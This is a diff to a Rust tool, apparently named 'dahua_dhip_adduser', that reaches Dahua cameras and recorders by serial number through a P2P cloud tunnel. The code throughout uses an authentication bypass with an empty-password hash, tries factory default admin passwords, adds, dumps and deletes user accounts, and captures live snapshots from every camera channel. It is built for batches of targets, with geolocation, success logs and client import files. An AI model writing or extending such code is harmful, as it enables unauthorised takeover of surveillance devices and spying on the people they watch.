@@ -1,4 +1,5 @@
 mod p2p;
+mod sdk;
 
 use std::sync::atomic::Ordering;
 use std::sync::Arc;
@@ -6,9 +7,10 @@ use std::time::Duration;
 
 use clap::Parser;
 use dahua_dhip_adduser::license;
+use dahua_dhip_adduser::paths;
 use p2p::*;
 use serde_json::{json, Value};
-use tokio::net::UdpSocket;
+use tokio::net::{TcpListener, UdpSocket};
 use tokio::sync::Mutex;
 
 #[derive(Parser)]
@@ -69,9 +71,17 @@ struct Args {
         help = "Try common factory default admin passwords before the bypass"
     )]
     try_defaults: bool,
-    #[arg(long, default_value = "ok_serials.txt")]
+    #[arg(
+        long,
+        default_value = "",
+        help = "Override the ok log path (default: log/ok<stem>.log)"
+    )]
     ok_file: String,
-    #[arg(long, default_value = "nok_serials.txt")]
+    #[arg(
+        long,
+        default_value = "",
+        help = "Override the nok log path (default: log/nok<stem>.log)"
+    )]
     nok_file: String,
     #[arg(long, help = "Skip SmartPSS XML generation")]
     no_xml: bool,
@@ -90,6 +100,56 @@ struct Args {
         help = "Capture a live JPG snapshot of every active camera channel from each device (auto-discovers channels). Uses --user/--password as the camera stream credentials in the snapshot CGI query string."
     )]
     snapshot: bool,
+    #[arg(
+        long,
+        help = "When snapshot fails via P2P tunnel, retry via direct HTTP to the device's public IP (port 80)"
+    )]
+    direct_http: bool,
+    #[arg(
+        long,
+        help = "When snapshot fails via HTTP, retry via RTSP to the device's public IP (port 554, MJPEG only)"
+    )]
+    rtsp: bool,
+    #[arg(
+        long,
+        default_value_t = 0,
+        help = "Network timeout in seconds for the P2P channel wait, PTCP bind, DHIP and HTTP calls (0 = built-in defaults: 10s challenge/login, 15s list/delete)"
+    )]
+    timeout: u64,
+    #[arg(
+        long,
+        default_value = "",
+        help = "Override the P2P main server (default: www.easy4ipcloud.com:8800 round-robin). Use for cross-region devices, e.g. --main-server 165.154.165.42:8800"
+    )]
+    main_server: String,
+    #[arg(
+        long,
+        default_value = "",
+        help = "Override the relay server for the device tunnel (default: the address from /online/relay). Use for cross-region devices the default relay cannot reach, e.g. --relay-server 148.153.240.184:8900"
+    )]
+    relay_server: String,
+    #[arg(
+        long,
+        default_value = "",
+        help = "Override the agent server from /relay/agent (default: the agent the relay returns). Use when the device only answers on its specific/home agent instance, e.g. --agent-server 148.153.221.60:27052"
+    )]
+    agent_server: String,
+    #[arg(
+        long,
+        help = "Diagnostic: run the binary SDK (37777/A0) login through the tunnel on each device and report serial/model/channels. Bypasses the DHIP JSON challenge."
+    )]
+    sdk_test: bool,
+}
+
+impl Args {
+    /// Network timeout: `--timeout` when set (>0), otherwise the per-call default.
+    fn timeout_or(&self, default_secs: u64) -> Duration {
+        if self.timeout > 0 {
+            Duration::from_secs(self.timeout)
+        } else {
+            Duration::from_secs(default_secs)
+        }
+    }
 }
 
 fn license_status_reason(st: &license::LicenseStatus) -> String {
@@ -105,7 +165,7 @@ fn license_status_reason(st: &license::LicenseStatus) -> String {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
     HTTP_DEBUG.store(args.verbose, Ordering::Relaxed);
-    let probe_timeout = Duration::from_secs(10);
+    let probe_timeout = args.timeout_or(10);
 
     match license::check_license() {
         license::LicenseStatus::Valid => {}
@@ -150,6 +210,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         std::process::exit(1);
     };
 
+    if args.sdk_test {
+        return sdk_test_devices(&serials, &args, probe_timeout).await;
+    }
+
     if args.list_users || args.dump_account {
         return list_users(&serials, &args, probe_timeout).await;
     }
@@ -188,6 +252,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut ok_count = 0u32;
     let mut fail_count = 0u32;
     let mut ok_serials: Vec<String> = Vec::new();
+    let mut ok_serials_raw: Vec<String> = Vec::new();
     let mut nok_serials: Vec<String> = Vec::new();
 
     for (i, serial) in serials.iter().enumerate() {
@@ -199,6 +264,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             Ok(geo) => {
                 println!("[+] {} \u{2192} OK", serial);
                 ok_count += 1;
+                ok_serials_raw.push(serial.clone());
                 let geo = geo.unwrap_or_default();
                 ok_serials.push(format!(
                     "{}_{}_{}_{}_{}",
@@ -213,12 +279,33 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    std::fs::write(&args.ok_file, ok_serials.join("\n")).ok();
-    std::fs::write(&args.nok_file, nok_serials.join("\n")).ok();
+    // Log names follow the input that drove the run: a serials file gives
+    // log/ok<stem>.log, a bare --serial gives log/ok<serial>.log. An explicit
+    // --ok-file/--nok-file still wins, so the GUI can pin the paths.
+    let (derived_ok, derived_nok) =
+        paths::log_files(args.serials_file.as_deref(), args.serial.as_deref());
+    let ok_path = if args.ok_file.trim().is_empty() {
+        derived_ok
+    } else {
+        args.ok_file.clone()
+    };
+    let nok_path = if args.nok_file.trim().is_empty() {
+        derived_nok
+    } else {
+        args.nok_file.clone()
+    };
+
+    for p in [&ok_path, &nok_path] {
+        if let Err(e) = paths::ensure_parent_dir(p) {
+            eprintln!("[-] cannot create the folder for '{}': {}", p, e);
+        }
+    }
+    std::fs::write(&ok_path, ok_serials.join("\n")).ok();
+    std::fs::write(&nok_path, nok_serials.join("\n")).ok();
 
     if !ok_serials.is_empty() && !args.no_xml {
         let now: chrono::DateTime<chrono::Local> = chrono::Local::now();
-        let xml_name = format!(
+        let file_name = format!(
             "{:04}{:02}{:02}-{:02}{:02}{:02}.xml",
             now.year(),
             now.month(),
@@ -227,6 +314,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             now.minute(),
             now.second()
         );
+        let xml_name = paths::xml_file(&file_name);
+        if let Err(e) = paths::ensure_parent_dir(&xml_name) {
+            eprintln!("[-] cannot create the XML folder: {}", e);
+        }
         match generate_smartpss_from_ok(&ok_serials, &xml_name, &serial_names) {
             Ok(()) => println!("[*] SmartPSS XML saved to {}", xml_name),
             Err(e) => eprintln!("[-] SmartPSS XML generation failed: {}", e),
@@ -241,16 +332,114 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         serials.len()
     );
     if !ok_serials.is_empty() {
-        println!("[*] OK serials saved to {}", args.ok_file);
+        println!("[*] OK serials saved to {}", ok_path);
     }
     if !nok_serials.is_empty() {
-        println!("[*] NOK serials saved to {}", args.nok_file);
+        println!("[*] NOK serials saved to {}", nok_path);
     }
 
     if args.snapshot {
-        snapshot_devices(&serials, &args, probe_timeout).await?;
+        if ok_serials_raw.is_empty() {
+            eprintln!("[*] snapshot skipped: addUser failed on all serials");
+        } else {
+            snapshot_devices(&ok_serials_raw, &args, probe_timeout).await?;
+        }
     }
 
+    Ok(())
+}
+
+/// Diagnostic: open the tunnel and run the binary SDK (A0, port 37777) login
+/// on each device, reporting serial/model/channels. Unlike the normal flows it
+/// does NOT need the DHIP JSON challenge to succeed, so it tells whether the
+/// tunnel carries data and whether the device speaks the A0/SDK dialect.
+async fn sdk_test_devices(
+    serials: &[String],
+    args: &Args,
+    probe_timeout: Duration,
+) -> Result<(), Box<dyn std::error::Error>> {
+    for (i, serial) in serials.iter().enumerate() {
+        println!("\n========================================");
+        println!("[{}/{}] {} — SDK test", i + 1, serials.len(), serial);
+        println!("========================================");
+
+        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
+            Ok(h) => h,
+            Err(e) => {
+                eprintln!("  [-] P2P handshake failed: {}", e);
+                continue;
+            }
+        };
+        let (sock, pcp_session) = if args.relay {
+            (&hr.agent_socket, &hr.agent_session)
+        } else {
+            (&hr.device_socket, &hr.device_session)
+        };
+
+        let mut creds: Vec<(String, String, String)> = Vec::new();
+        for (quser, qpass) in [
+            (args.admin_user.clone(), args.admin_pass.clone()),
+            (args.user.clone(), args.password.clone()),
+        ] {
+            if !quser.is_empty() && !qpass.is_empty() {
+                creds.push((String::new(), quser, qpass));
+            }
+        }
+        if args.try_defaults {
+            for pw in DEFAULT_ADMIN_PASSWORDS {
+                if args.admin_user.is_empty() || args.admin_pass == *pw {
+                    continue;
+                }
+                creds.push((
+                    "default".to_string(),
+                    args.admin_user.clone(),
+                    (*pw).to_string(),
+                ));
+            }
+        }
+        if args.admin_pass.is_empty() && args.password.is_empty() {
+            creds.push((String::new(), "admin".to_string(), String::new()));
+        }
+        if creds.is_empty() {
+            creds.push((String::new(), "admin".to_string(), String::new()));
+        }
+
+        let mut done = false;
+        for (label, quser, qpass) in creds {
+            let tag = if label.is_empty() {
+                quser.clone()
+            } else {
+                label
+            };
+            if args.verbose {
+                eprintln!("  [debug] sdk-test creds: {}", tag);
+            }
+            let client = sdk::SdkClient::new(&quser, &qpass).with_verbose(args.verbose);
+            match client.get_device_info(sock, pcp_session).await {
+                sdk::SdkInfo::Channels {
+                    serial: s,
+                    model,
+                    channels,
+                } => {
+                    println!(
+                        "[+] SDK OK on {}: serial={} model={} channels={}",
+                        tag, s, model, channels
+                    );
+                    done = true;
+                    break;
+                }
+                sdk::SdkInfo::BindFailed => {
+                    eprintln!("  [-] SDK bind on 37777 failed (tunnel not carrying the bind)");
+                }
+                sdk::SdkInfo::LoginFailed => {
+                    eprintln!("  [-] SDK bind OK but login {} rejected", tag);
+                }
+            }
+        }
+        if !done {
+            eprintln!("  [-] {} → SDK TEST FAIL", serial);
+        }
+    }
     Ok(())
 }
 
@@ -267,10 +456,22 @@ async fn p2p_handshake_retry(
     for attempt in 1..=attempts {
         match p2p_handshake(
             serial,
+            &args.main_server,
             args.relay,
             &args.admin_user,
             &args.admin_pass,
             args.try_defaults,
+            args.timeout_or(15),
+            if args.relay_server.is_empty() {
+                None
+            } else {
+                Some(args.relay_server.as_str())
+            },
+            if args.agent_server.is_empty() {
+                None
+            } else {
+                Some(args.agent_server.as_str())
+            },
         )
         .await
         {
@@ -320,7 +521,7 @@ async fn list_users(
             let result = http_list_users(
                 sock,
                 pcp_session,
-                probe_timeout,
+                args.timeout_or(15),
                 args.verbose,
                 true,
                 &args.admin_user,
@@ -353,7 +554,7 @@ async fn list_users(
                         let result = http_list_users(
                             sock,
                             pcp_session,
-                            probe_timeout,
+                            args.timeout_or(15),
                             args.verbose,
                             false,
                             &args.admin_user,
@@ -416,13 +617,12 @@ async fn ptcp_bind_retry(
 async fn http_list_users(
     sock: &UdpSocket,
     pcp_session: &Mutex<PTCPSession>,
-    _probe_timeout: Duration,
+    timeout: Duration,
     verbose: bool,
     dump_account: bool,
     admin_user: &str,
     admin_pass: &str,
 ) -> Result<(), String> {
-    let timeout = Duration::from_secs(15);
     for &port in &[80u16, 5000] {
         if verbose {
             eprintln!("[debug] http_list_users: trying port {}", port);
@@ -465,7 +665,7 @@ async fn http_list_users_on_port(
     if verbose {
         eprintln!("[debug] http_list_users_on_port: trying port {}", port);
     }
-    let bind_timeout = Duration::from_secs(15);
+    let bind_timeout = timeout;
     let realm_id = match ptcp_bind_retry(sock, pcp_session, port, bind_timeout, verbose).await {
         Some(id) => id,
         None => return Err(format!("PTCP bind failed on port {}", port)),
@@ -733,7 +933,7 @@ async fn dhip_list_users(
             return Err(e);
         }
     };
-    let timeout = Duration::from_secs(5);
+    let timeout = args.timeout_or(5);
     let (users, listed) = dhip_list_all_users(
         sock,
         pcp_session,
@@ -787,25 +987,45 @@ async fn try_add_user(
 
     // Step 1: DHIP login challenge to get the realm (SmartPSS uses this realm).
     // The bound channel stays open and is reused for the DHIP add below.
-    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
-        .await
-        .ok_or("DHIP challenge failed (no realm)")?;
+    // Some firmware (e.g. China-market devp2p 6.7.5) never answers the JSON
+    // `global.login` on any port (they speak the A0/SDK dialect instead): the
+    // challenge returns None there, and we fall straight through to the
+    // HTTP/RPC2 fallback below instead of aborting.
+    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout).await;
+    let chal_realm = chal.as_ref().map(|c| c.realm.clone()).unwrap_or_default();
+    let mut device_http_port: Option<u16> = None;
 
-    if args.verbose {
-        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
+    if let Some(chal_ref) = chal.as_ref() {
+        if args.verbose {
+            eprintln!(
+                "[debug] DHIP realm: {:?} (port {})",
+                chal_realm, chal_ref.port
+            );
+        }
+
+        // Primary: addUser over DHIP directly on the live challenge channel.
+        // `device_http_port` gets the device's real HTTP port (InetWeb) when the
+        // session could be established, so the HTTP fallback binds the right port.
+        if dhip_add_on_challenge(
+            sock,
+            pcp_session,
+            chal_ref,
+            args,
+            probe_timeout,
+            &mut device_http_port,
+        )
+        .await
+        .is_ok()
+        {
+            return Ok(resolve_geo(&device_ip).await);
+        }
     }
 
-    // Primary: addUser over DHIP directly on the live challenge channel.
-    let mut last_err =
-        match dhip_add_on_challenge(sock, pcp_session, &chal, args, probe_timeout).await {
-            Ok(()) => return Ok(resolve_geo(&device_ip).await),
-            Err(e) => {
-                if args.verbose {
-                    eprintln!("[debug] DHIP addUser failed ({}), trying HTTP", e);
-                }
-                e
-            }
-        };
+    let mut last_err = if chal.is_some() {
+        "DHIP addUser failed".to_string()
+    } else {
+        "DHIP challenge failed (no realm)".to_string()
+    };
 
     // Il canale del challenge è probabilmente morto dopo il fallimento DHIP (alcuni
     // device accettano un solo canale PTCP e rifiutano il re-bind sulla stessa porta,
@@ -815,10 +1035,7 @@ async fn try_add_user(
         Ok(h) => h,
         Err(e) => {
             eprintln!("  [-] P2P re-handshake for HTTP fallback failed: {}", e);
-            return Err(format!(
-                "DHIP addUser failed ({}); plus P2P re-handshake failed: {}",
-                last_err, e
-            ));
+            return Err(format!("{}; plus P2P re-handshake failed: {}", last_err, e));
         }
     };
     let (sock2, pcp_session2) = if args.relay {
@@ -827,11 +1044,24 @@ async fn try_add_user(
         (&hr2.device_socket, &hr2.device_session)
     };
 
-    // Fallback: HTTP/RPC2 on port 80 first, then 5000 (fresh sockets).
-    let ports = &[80u16, 5000];
-    for &port in ports {
+    // Fallback: HTTP/RPC2 on fresh sockets. The device's real HTTP port (read
+    // from InetWeb while the DHIP session was live) comes first; 80/5000 stay
+    // as guesses for when that query was not possible or reported nothing.
+    let mut ports: Vec<u16> = Vec::new();
+    if let Some(p) = device_http_port {
+        ports.push(p);
+    }
+    for p in [80u16, 5000] {
+        if !ports.contains(&p) {
+            ports.push(p);
+        }
+    }
+    if args.verbose {
+        eprintln!("[debug] HTTP fallback ports: {:?}", ports);
+    }
+    for &port in &ports {
         let result =
-            http_try_add_user(sock2, pcp_session2, &chal.realm, port, args, probe_timeout).await;
+            http_try_add_user(sock2, pcp_session2, &chal_realm, port, args, probe_timeout).await;
         match result {
             Ok(()) => return Ok(resolve_geo(&device_ip).await),
             Err(e) => {
@@ -871,6 +1101,7 @@ async fn dhip_add_on_challenge(
     chal: &DhipChallengeInfo,
     args: &Args,
     probe_timeout: Duration,
+    http_port_out: &mut Option<u16>,
 ) -> Result<(), String> {
     let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
         Ok(c) => c,
@@ -879,6 +1110,21 @@ async fn dhip_add_on_challenge(
             return Err(e);
         }
     };
+
+    // Read the device's real HTTP port while the session is still live: the
+    // HTTP fallback below must bind that port instead of guessing 80/5000.
+    let ports = query_network_ports(
+        sock,
+        pcp_session,
+        &ctx.dhip,
+        ctx.session_id,
+        probe_timeout,
+        args.verbose,
+    )
+    .await;
+    if let Some(p) = ports.http {
+        *http_port_out = Some(p);
+    }
 
     // DHIP addUser with HA1 hash (MD5(user:realm:password)) so SmartPSS can authenticate
     let pw_hash = http_adduser_password_hash(&args.user, &chal.realm, &args.password);
@@ -1146,7 +1392,7 @@ async fn dhip_try_delete_user(
     let session_id = ctx.session_id;
     let realm_id = chal.realm_id;
 
-    let timeout = Duration::from_secs(5);
+    let timeout = args.timeout_or(5);
     let mut result = Err("DHIP deleteUser failed".into());
 
     let mut name = user_name.clone();
@@ -1269,7 +1515,7 @@ async fn dhip_try_delete_all(
     let session_id = ctx.session_id;
     let realm_id = chal.realm_id;
 
-    let timeout = Duration::from_secs(5);
+    let timeout = args.timeout_or(5);
 
     // List all users (full fallback chain: getUserInfoAll, getUserList, getConfig Account).
     let (users, listed) =
@@ -1380,7 +1626,7 @@ async fn dhip_add_user_with_account(
     pw_hash: &str,
     args: &Args,
 ) -> Result<(), String> {
-    let timeout = Duration::from_secs(10);
+    let timeout = args.timeout_or(10);
 
     // Query device's supported authority list
     let authority_list =
@@ -1730,7 +1976,7 @@ async fn dhp_challenge_on_port(
     probe_timeout: Duration,
     port: u16,
 ) -> Option<DhipChallengeInfo> {
-    let bind_timeout = Duration::from_secs(15);
+    let bind_timeout = args.timeout_or(15);
     let realm_id = match ptcp_bind(sock, pcp_session, port, bind_timeout).await {
         Some(r) => r,
         None => {
@@ -1740,6 +1986,12 @@ async fn dhp_challenge_on_port(
             return None;
         }
     };
+    if args.verbose {
+        eprintln!(
+            "[debug] dhp_challenge: ptcp_bind on {} ok (realm={})",
+            port, realm_id
+        );
+    }
 
     let dhip = Arc::new(Mutex::new(DhipSession::new(realm_id)));
 
@@ -1827,13 +2079,13 @@ async fn http_try_add_user(
     if args.verbose {
         eprintln!("[debug] HTTP addUser using port {}", port);
     }
-    let bind_timeout = Duration::from_secs(15);
+    let bind_timeout = args.timeout_or(15);
     let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout)
         .await
         .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;
 
     let host = format!("127.0.0.1:{}", port);
-    let timeout = Duration::from_secs(10);
+    let timeout = args.timeout_or(10);
 
     // Step 1: HTTP login challenge
     let login1 = json!({
@@ -1899,9 +2151,21 @@ async fn http_try_add_user(
     }
 
     // Use http_realm for the bypass hash, but dh_realm for the addUser password hash
+    // (SmartPSS stores HA1 with the DHIP numeric realm). When no DHIP realm is
+    // available (the JSON challenge never answered, e.g. A0/SDK-only firmware),
+    // fall back to the HTTP challenge realm for the addUser hash.
+    let add_realm = if dh_realm.is_empty() {
+        http_realm
+    } else {
+        dh_realm
+    };
     if args.verbose {
         eprintln!("[debug] HTTP login realm: {:?}", http_realm);
-        eprintln!("[debug] Using DHIP realm for addUser hash: {:?}", dh_realm);
+        eprintln!(
+            "[debug] Using {} realm for addUser hash: {:?}",
+            if dh_realm.is_empty() { "HTTP" } else { "DHIP" },
+            add_realm
+        );
     }
 
     // Step 2: HTTP bypass login (same empty_password_hash as DHIP)
@@ -2028,7 +2292,7 @@ async fn http_add_user(
     realm: &str,
     args: &Args,
 ) -> Result<(), String> {
-    let timeout = Duration::from_secs(10);
+    let timeout = args.timeout_or(10);
     let pw_hash = http_adduser_password_hash(&args.user, realm, &args.password);
 
     if args.verbose {
@@ -2788,45 +3052,113 @@ async fn check_p2p_device(
 /// Capture a live JPG snapshot of every active camera channel of each device.
 /// Discovers the channels via configManager.getConfig, then grabs `/cgi-bin/
 /// snapshot.cgi?channel=N` through the same PTCP tunnel.
+/// Snapshot output folder. A run driven by a serials/XML file gets its own
+/// `snapshot - <file stem>` folder, so batches do not pile up in a single
+/// `snapshots/` dir; a single `--serial` keeps the plain name.
+fn snapshot_output_dir(serials_file: Option<&str>) -> String {
+    let Some(path) = serials_file else {
+        return "snapshots".to_string();
+    };
+    let stem = std::path::Path::new(path)
+        .file_stem()
+        .map(|s| s.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let stem = stem.trim();
+    if stem.is_empty() {
+        return "snapshots".to_string();
+    }
+    format!("snapshot - {}", stem)
+}
+
 async fn snapshot_devices(
     serials: &[String],
     args: &Args,
     probe_timeout: Duration,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    if args.user.is_empty() || args.password.is_empty() {
-        return Err(
-            "--snapshot requires --user (-u) and --password (-w) as the camera stream credentials"
-                .into(),
-        );
-    }
-    std::fs::create_dir_all("snapshots").ok();
-    let mut failed_serials: Vec<String> = Vec::new();
+    // snapshot credentials are optional: admin_pass and session cookie are tried first.
+    let out_dir = snapshot_output_dir(args.serials_file.as_deref());
+    std::fs::create_dir_all(&out_dir).ok();
+    println!("[*] snapshot output folder: {}", out_dir);
+    let mut failed: Vec<(String, String)> = Vec::new();
     for (i, serial) in serials.iter().enumerate() {
         println!("\n========================================");
         println!("[{}/{}] snapshot {}", i + 1, serials.len(), serial);
         println!("========================================");
-        match snapshot_device(serial, args, probe_timeout).await {
+        match snapshot_device(serial, args, &out_dir, probe_timeout).await {
             Ok(()) => {}
             Err(e) => {
                 eprintln!("  [-] {} → SNAPSHOT FAIL: {}", serial, e);
-                failed_serials.push(serial.clone());
+                failed.push((serial.clone(), e));
             }
         }
     }
-    if !failed_serials.is_empty() {
+    if !failed.is_empty() {
         let now: chrono::DateTime<chrono::Local> = chrono::Local::now();
         let log_name = format!("{}.log", now.format("%Y%d%m%H%M"));
-        std::fs::write(&log_name, failed_serials.join("\n") + "\n").ok();
+        // Record the reason next to the serial: a bare list of serials gives no
+        // clue about whether the device was offline, auth-blocked or unframed.
+        let body: String = failed
+            .iter()
+            .map(|(s, e)| format!("{}\t{}", s, e.replace('\n', " ")))
+            .collect::<Vec<_>>()
+            .join("\n");
+        std::fs::write(&log_name, body + "\n").ok();
         println!(
-            "[*] {} failed snapshot(s) — serials saved to {}",
-            failed_serials.len(),
+            "[*] {} failed snapshot(s) — serial + reason saved to {}",
+            failed.len(),
             log_name
         );
     }
     Ok(())
 }
 
-async fn snapshot_device(serial: &str, args: &Args, probe_timeout: Duration) -> Result<(), String> {
+/// Persist a snapshot response that arrived but could not be turned into a JPEG.
+///
+/// Only worth doing for a success status: that is the case where the device
+/// *did* answer with an image and something in our framing dropped it. `7C03FF7PAZ93E44`
+/// answered `200 OK` with a valid SOI but 2203 bytes and no EOI, and because
+/// that bind succeeds only intermittently the evidence is easy to lose. Writing
+/// the raw response means the next successful bind keeps the evidence on disk
+/// instead of in a log that is about to scroll away.
+fn dump_unusable_snapshot(
+    serial: &str,
+    ch: u32,
+    label: &str,
+    port: u16,
+    headers: &str,
+    body: &[u8],
+) {
+    let status = headers
+        .lines()
+        .find(|l| l.starts_with("HTTP/"))
+        .unwrap_or("");
+    if !status.contains(" 2") {
+        return;
+    }
+    let dir = std::path::Path::new("snapshots");
+    std::fs::create_dir_all(dir).ok();
+    let path = dir.join(format!("{}_ch{}_{}_{}.http", serial, ch, label, port));
+    let mut out = Vec::new();
+    out.extend_from_slice(headers.as_bytes());
+    out.push(b'\n');
+    out.extend_from_slice(body);
+    if std::fs::write(&path, &out).is_ok() {
+        eprintln!(
+            "  [debug] ch{} saved unusable {} response to {} ({} body bytes)",
+            ch,
+            status.trim(),
+            path.display(),
+            body.len()
+        );
+    }
+}
+
+async fn snapshot_device(
+    serial: &str,
+    args: &Args,
+    out_dir: &str,
+    probe_timeout: Duration,
+) -> Result<(), String> {
     let hr = p2p_handshake_retry(serial, args, args.verbose)
         .await
         .map_err(|e| format!("P2P handshake failed: {}", e))?;
@@ -2837,93 +3169,842 @@ async fn snapshot_device(serial: &str, args: &Args, probe_timeout: Duration) -> 
         (&hr.device_socket, &hr.device_session)
     };
 
-    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout)
-        .await
-        .ok_or("DHIP challenge failed (no realm)")?;
-    if args.verbose {
-        eprintln!("[debug] DHIP realm: {:?} (port {})", chal.realm, chal.port);
+    // The DHIP challenge + logged-in session is OPTIONAL on this path. A0/SDK-only
+    // devices refuse it (login error / silent logout), which used to abort the
+    // snapshot before any attempt. The channel count can come from the binary SDK
+    // (37777) and the ports from the decrypted /info/device blob, so the CGI/SDK/
+    // RTSP attempts below all work without a DHIP session — that is how p2pwn
+    // takes snapshots.
+    let mut ctx: Option<DhipCtx> = None;
+    let mut chal: Option<DhipChallengeInfo> = None;
+    if let Some(c) = dhp_challenge(sock, pcp_session, args, probe_timeout).await {
+        if args.verbose {
+            eprintln!("[debug] DHIP realm: {:?} (port {})", c.realm, c.port);
+        }
+        match dhip_established_session(sock, pcp_session, &c, args, probe_timeout).await {
+            Ok(cc) => {
+                ctx = Some(cc);
+                chal = Some(c);
+            }
+            Err(e) => {
+                if args.verbose {
+                    eprintln!(
+                        "  [debug] DHIP session failed ({}) — continuing without it",
+                        e
+                    );
+                }
+                ptcp_disconnect(sock, pcp_session, c.realm_id).await;
+            }
+        }
+    } else if args.verbose {
+        eprintln!("  [debug] DHIP challenge failed (no realm) — snapshot without DHIP session");
     }
 
-    let ctx = match dhip_established_session(sock, pcp_session, &chal, args, probe_timeout).await {
-        Ok(c) => c,
-        Err(e) => {
-            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
-            return Err(e);
-        }
-    };
-
     // 1) Discover active channels.
-    let mut channels =
-        discover_channels(sock, pcp_session, &ctx, args.verbose, probe_timeout).await;
-    if channels.is_empty() {
+    let mut channels = match ctx.as_ref() {
+        Some(c) => discover_channels(sock, pcp_session, c, args.verbose, probe_timeout).await,
+        None => Vec::new(),
+    };
+    let probing = channels.is_empty();
+    if probing {
+        // Middle fallback: ask binary SDK (37777, through the tunnel) for the
+        // channel count before resorting to a blind 1..=16 probe. Credentials
+        // tried: --user/--password, --admin-user/--admin-pass, then the
+        // factory default passwords (--try-defaults) and finally blank.
+        let mut creds: Vec<(String, String, String)> = Vec::new();
+        for (quser, qpass) in [
+            (args.user.clone(), args.password.clone()),
+            (args.admin_user.clone(), args.admin_pass.clone()),
+        ] {
+            if !quser.is_empty() && !qpass.is_empty() {
+                creds.push((String::new(), quser, qpass));
+            }
+        }
+        if args.try_defaults {
+            for pw in DEFAULT_ADMIN_PASSWORDS {
+                if args.admin_user.is_empty() || args.admin_pass == *pw {
+                    continue;
+                }
+                creds.push((
+                    format!("sdk-default"),
+                    args.admin_user.clone(),
+                    (*pw).to_string(),
+                ));
+            }
+        }
+        if args.password.is_empty() && args.admin_pass.is_empty() {
+            creds.push((String::new(), "admin".to_string(), String::new()));
+        }
+        for (label, quser, qpass) in creds {
+            if args.verbose {
+                let tag = if label.is_empty() {
+                    "sdk".to_string()
+                } else {
+                    label
+                };
+                eprintln!("  [debug] discover {} channels via {}", serial, tag);
+            }
+            let client = sdk::SdkClient::new(&quser, &qpass).with_verbose(args.verbose);
+            match client.get_device_info(sock, pcp_session).await {
+                sdk::SdkInfo::Channels { channels: n, .. } => {
+                    if n > 0 {
+                        println!(
+                            "  [!] no channel list exposed; SDK reports {} channel(s)",
+                            n
+                        );
+                        channels = (1..=n.min(16) as u32).collect();
+                        break;
+                    }
+                }
+                // The device refused to open the 37777 channel at all. That is a
+                // channel/slot limit, not a credentials problem, so the remaining
+                // logins would fail the same way — `7C03FF7PAZ93E44` burned six
+                // binds on this before falling through to a blind 1..=16 probe.
+                sdk::SdkInfo::BindFailed => {
+                    if args.verbose {
+                        eprintln!(
+                            "  [debug] SDK bind on 37777 refused, skipping remaining credentials"
+                        );
+                    }
+                    break;
+                }
+                sdk::SdkInfo::LoginFailed => {}
+            }
+        }
+    }
+    let probing = channels.is_empty();
+    if probing {
         println!("  [!] no channel list exposed; falling back to probe 1..=16");
         channels = (1..=16).collect();
     }
-    println!("  [i] {} channel(s) to snapshot", channels.len());
+    println!(
+        "  [i] {} channel(s) to snapshot{}",
+        channels.len(),
+        if probing { " (probing)" } else { "" }
+    );
+    // Diagnostic cap (env): restrict the snapshot loop to the first N channels,
+    // and cheaply e.g. when trialling digest variants against one channel.
+    if let Ok(max) = std::env::var("DAHUA_MAX_CH") {
+        if let Ok(n) = max.trim().parse::<usize>() {
+            channels.truncate(n);
+            eprintln!(
+                "  [debug] DAHUA_MAX_CH env: limited to {} channel(s)",
+                channels.len()
+            );
+        }
+    }
 
     // 2) Snapshot each channel over HTTP through the same tunnel.
-    let mut captured = 0usize;
-    for ch in &channels {
-        let path = format!(
-            "/cgi-bin/snapshot.cgi?channel={}&user={}&password={}",
-            ch, args.user, args.password
-        );
-        let mut body: Option<(String, Vec<u8>)> = None;
-        for &port in &[80u16, 5000u16] {
-            let host = format!("127.0.0.1:{}", port);
-            let r = http_get_binary(
+    //    Auth strategies (tried per-channel in order):
+    //      a) Session cookie only (DHIP session already authenticated)
+    //      b) Admin credentials (same ones used for addUser)
+    //      c) Camera stream credentials (-u/-w)
+    //    If --direct-http is set and all PTCP methods fail, retry via direct TCP to device IP.
+    let session_str = ctx
+        .as_ref()
+        .map(|c| c.session_id.to_string())
+        .unwrap_or_default();
+    let device_ip = hr.device_public_ip.clone();
+
+    // Query the device for its actual HTTP and RTSP ports. When a DHIP session
+    // is available the InetWeb/Network config tables win; the decrypted
+    // /info/device blob (`httpport`/`rtspport`) from the handshake fills in when
+    // it is not (A0/SDK-only devices) or when the tables stay quiet.
+    let mut ports = NetworkPorts {
+        http: hr.device_http_port,
+        rtsp: hr.device_rtsp_port,
+    };
+    if let Some(c) = ctx.as_ref() {
+        let queried = query_network_ports(
+            sock,
+            pcp_session,
+            &c.dhip,
+            c.session_id,
+            probe_timeout,
+            args.verbose,
+        )
+        .await;
+        if queried.http.is_some() {
+            ports.http = queried.http;
+        }
+        if queried.rtsp.is_some() {
+            ports.rtsp = queried.rtsp;
+        }
+    }
+    let http_port = ports.http.unwrap_or(80);
+    let rtsp_port = ports.rtsp.unwrap_or(554);
+
+    // From here on nothing in the snapshot path needs the live DHIP channel: the
+    // HTTP attempts re-bind a fresh realm per request and the SDK binds its own.
+    // `7C03FF7PAZ93E44` accepts a single PTCP channel, so holding DHIP while
+    // binding HTTP (or 37777) made every bind fail. Release it once, here,
+    // after the last DHIP read (the InetWeb port query above).
+    let mut dhip_freed = true;
+    if let Some(c) = chal.as_ref() {
+        if args.verbose {
+            eprintln!(
+                "  [debug] freeing DHIP realm={} before PTCP HTTP binds",
+                c.realm_id
+            );
+        }
+        ptcp_disconnect(sock, pcp_session, c.realm_id).await;
+    }
+
